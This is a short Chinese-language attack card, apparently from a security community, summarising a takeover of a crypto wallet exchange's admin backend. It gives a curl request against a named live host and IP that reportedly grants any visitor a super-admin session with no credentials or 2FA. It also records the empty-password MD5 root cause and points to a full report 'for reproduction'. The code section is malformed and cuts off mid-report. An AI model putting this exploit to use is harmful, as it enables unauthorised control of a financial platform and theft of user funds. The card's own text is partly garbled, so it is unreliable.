# VI 钱包后台接管 / 资金面

- Source report: `2026-07-23_VI钱包后台-完整控制报告.md`
- Full report: `domains/business-logic/case-reports/vi-wallet-admin-takeover/2026-07-23_VI钱包后台-完整控制报告.md`
- Techniques: wallet, auth, payment
- Fused: 2026-09-17

## Key findings (distilled)

- 失效既有 JWT 签名密钥

## Repro snippets

```
curl -k -X POST "https://exchange-module.complex-z.com/x7k9m2/entry" \
  -H "Content-Type: application/json" \
  -H "Origin: https://52.76.104.254" \
  -H "Referer: https://52.76.104.254/" \
  -d "{}"
JWT payload（解码）：
### 2.3 严重性

| 维度 | 说明 |
|------|------|
| 影响 | 任意互联网访问者可获取**超级管理员会话** |
| 条件 | 无账号、无密码、无 2FA |
| 根因 | 登录处理器对空/缺省凭据仍走“成功签发”分支（或默认账号 242 空口令逻辑） |
| 关联证据 | `password_hashed = d41d8cd98f00b204e9800998ecf8427e`（**空字符串 MD5**） |

---

## 3. 控制证明

### 3.1 身份

调用：
```

## When to reuse

- 同类标签命中：wallet, auth, payment
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
